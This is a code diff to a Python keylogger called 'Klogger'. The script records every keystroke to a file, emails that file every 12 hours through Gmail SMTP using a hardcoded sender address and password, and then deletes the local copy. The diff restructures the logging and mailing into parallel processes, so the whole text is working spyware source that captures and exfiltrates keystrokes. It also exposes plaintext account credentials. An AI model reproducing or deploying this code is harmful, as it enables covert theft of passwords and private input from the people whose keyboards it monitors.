@@ -7,21 +7,7 @@ from datetime import datetime
 import os
 import yagmail
 from apscheduler.schedulers.blocking import BlockingScheduler
-
-def sendLog(log):
-    sender_email = "kloggertest42069@gmail.com"
-    receiver_email = "kloggertest42069@gmail.com"
-    subject = "Klogger"
-    sender_password = "rotkiv1234"
-
-    yag = yagmail.SMTP(user=sender_email, password=sender_password)
-
-    contents = [
-    "Klogger of the day"
-    ]
-
-
-    yag.send(receiver_email, subject, contents, attachments=log )
+from multiprocessing import Process
 
 def Klogger():
 
@@ -43,19 +29,38 @@ def Klogger():
             else:
                 f.write('{} - '.format(key))
 
+
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-sched = BlockingScheduler()
-Klogger()
+def sendLog(log):
+    sender_email = "kloggertest42069@gmail.com"
+    receiver_email = "kloggertest42069@gmail.com"
+    subject = "Klogger"
+    sender_password = "rotkiv1234"
 
-@sched.scheduled_job('interval', seconds=30)
-def timed_job():
-        homedir = os.path.expanduser("~")
-        homedir = homedir + "keylog.txt"
+    yag = yagmail.SMTP(user=sender_email, password=sender_password)
 
+    contents = [
+    "Klogger of the day"
+    ]
+
+
+    yag.send(receiver_email, subject, contents, attachments=log )
+
+def mailInterval():
+    sched = BlockingScheduler()
+    @sched.scheduled_job('interval', hours=12)
+    def timed_job():
+        homedir = "keylog.txt"
         sendLog(homedir)
         os.remove(homedir)
+    sched.start()
 
-
-sched.start()
+if __name__ == '__main__':
+    p1 = Process(target=Klogger)
+    p1.start()
+    p2 = Process(target=mailInterval)
+    p2.start()
+    p1.join()
+    p2.join()
